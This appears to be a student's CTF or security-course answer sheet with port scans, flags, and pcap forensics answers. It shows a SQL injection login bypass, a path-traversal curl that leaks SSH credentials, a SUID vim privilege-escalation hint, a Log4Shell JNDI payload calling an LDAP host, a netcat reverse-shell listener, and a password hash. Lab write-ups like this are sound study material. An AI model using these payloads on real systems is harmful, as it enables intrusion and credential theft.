# CS-SA10-25004-felix-
1 22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
<img width="1920" height="1080" alt="Screenshot_2025-08-09_11_12_47" src="https://github.com/user-attachments/assets/0f98c4c7-4a0e-4d65-a02c-e71f4cfa997f" />
2  Apache/2.4.58 (Ubuntu)
<img width="1920" height="1080" alt="Screenshot_2025-08-09_11_16_19" src="https://github.com/user-attachments/assets/507cdaf0-8838-4d97-818e-07d9adfa5d84" />
3 Welcome, ' OR '1'='1' # Logout
<img width="1920" height="1080" alt="Screenshot_2025-08-09_11_34_23" src="https://github.com/user-attachments/assets/64a4f1c8-9fc8-43a5-b1db-7982224f9fc0" />
4  Default Note: I think I made a mistake and now we have something hackers call LFI, I'll fix it later. Ooh and I need to modify the configuration.conf file. FLAG: cske_sa{default_note_flag_sa_c2_25_final}
<img width="1920" height="1080" alt="Screenshot_2025-08-09_11_37_44" src="https://github.com/user-attachments/assets/8df0711c-f2ee-41f5-8c94-b1813cbb98b5" />
5FLAG: cske_sa{default_note_flag_sa_c2_25_final}
6 LFI
7http://54.146.36.31/notes/view.php?title=default_note.txt
<img width="1920" height="1080" alt="Screenshot_2025-08-09_11_43_49" src="https://github.com/user-attachments/assets/11443403-0976-4e79-bfaf-5ff8778038d9" />
8 ┌──(hollyspirit㉿kali)-[~]
└─$ curl "http://54.146.36.31/notes/view.php?title=../configuration.conf"
ssh_user=cskeuser
ssh_pass=OvxioupwJ4RfFxSW
FLAG=cske_sa{configuration_file_flag_sa_c2_25_final}

<img width="1920" height="1080" alt="Screenshot_2025-08-09_11_47_48" src="https://github.com/user-attachments/assets/7fc76979-7159-4aa0-8227-47606941a025" />
9ssh_user=cskeuser
ssh_pass=OvxioupwJ4RfFxSW
10  <img width="1920" height="1080" alt="Screenshot_2025-08-09_11_52_00" src="https://github.com/user-attachments/assets/7223dbaf-3317-4faa-a17b-97d09859fab0" />
11 cske_sa{hidden_flag!?_sa_c2_25_final}
 <img width="1920" height="1080" alt="Screenshot_2025-08-09_11_53_56" src="https://github.com/user-attachments/assets/98ef119e-60c7-4840-8006-39b333f641e6" />
12ubuntu (UID 1000)

cskeuser (UID 1001)

user1 (UID 1002)

user2 (UID 1003)

user3 (UID 1004)
<img width="1920" height="1080" alt="Screenshot_2025-08-09_11_55_39" src="https://github.com/user-attachments/assets/c9ea7e81-fa2d-4c13-88a9-a338bfc2656f" />
13/home/cskeuser  /home/ubuntu  /home/user3
<img width="1920" height="1080" alt="Screenshot_2025-08-09_11_57_18" src="https://github.com/user-attachments/assets/5b0d3e95-0aac-47c4-bb7b-9f924b3272a7" />
14/u<img width="1920" height="1080" alt="Screenshot_2025-08-09_12_00_35" src="https://github.com/user-attachments/assets/741922ef-bec8-4c5a-80fe-aa749d13aa74" />
sr/local/bin/vim
15  

Forensics Questions (30 marks)
1 426 packets
2 4 <img width="1920" height="1080" alt="Screenshot_2025-08-09_12_18_14" src="https://github.com/user-attachments/assets/f691e9b7-d875-4b9f-ab00-c498a7d089ce" />
3 10.10.10.31
172.16.238.1
172.16.238.10
172.16.238.11
4  version 4 
<img width="1920" height="1080" alt="Screenshot_2025-08-09_12_22_43" src="https://github.com/user-attachments/assets/d43906e0-b8ee-443a-a533-3239bce02fa8" />
5uname=${jndi:ldap://172.16.238.11:1389/a}
uname=${jndi:ldap://172.16.238.11:1389/a}
<img width="1920" height="1080" alt="Screenshot_2025-08-09_12_29_04" src="https://github.com/user-attachments/assets/d04ce7d6-019b-49a9-8b30-867ff4f02b51" />
6  Server: SimpleHTTP/0.6 Python/3.4.2
<img width="1920" height="1080" alt="Screenshot_2025-08-09_12_33_14" src="https://github.com/user-attachments/assets/5d173c01-ec7f-411d-bc4f-18845cf94ad3" />
7 172.16.238.10
<img width="1920" height="1080" alt="Screenshot_2025-08-16_11_26_30" src="https://github.com/user-attachments/assets/d9071988-749a-4ea4-8bc4-b68c3af6b055" />


8 Destination80 Port: 80
<img width="1920" height="1080" alt="Screenshot_2025-08-16_11_30_50" src="https://github.com/user-attachments/assets/f234b664-fb9d-433e-b050-ddc9b54c9887" />
9  172.16.238.1
<img width="1920" height="1080" alt="Screenshot_2025-08-16_11_46_43" src="https://github.com/user-attachments/assets/0e90d00f-9f9d-40f9-a8e6-95f6d7c4ac8a" />
10 
Server: SimpleHTTP/0.6 Python/3.4.2\r\n
<img width="1920" height="1080" alt="Screenshot_2025-08-16_12_32_01" src="https://github.com/user-attachments/assets/0f05f04b-9e81-49dc-b5ca-a61536fc5023" />


11 10.10.10.31
<img width="1920" height="1080" alt="Screenshot_2025-08-16_12_19_19" src="https://github.com/user-attachments/assets/e21a1f40-9a03-4991-8930-8c0b29285849" />
12 port  9001
<img width="1920" height="1080" alt="Screenshot_2025-08-16_12_23_27" src="https://github.com/user-attachments/assets/515e968b-312f-4e94-b09e-f9606da37b73" />
13
nc -lvnp 9001


14
id
<img width="1920" height="1080" alt="Screenshot_2025-08-16_12_26_09" src="https://github.com/user-attachments/assets/db78093c-dcbf-4816-b393-f8526d2a0466" />
15 user:$6$FrLlfpte$okbfA753Sj2SSVu4czU2kyvwiUgp5xUlAyjBGCiiuowquISi8SMsn5xXSUqBKQ/2DSSQA3KBpKUAxZCmAEjjS/:16715:0:99999:7:::
<img width="1920" height="1080" alt="Screenshot_2025-08-16_12_28_02" src="https://github.com/user-attachments/assets/c54affdb-ad68-4aea-a480-ba8c2cc764e0" />

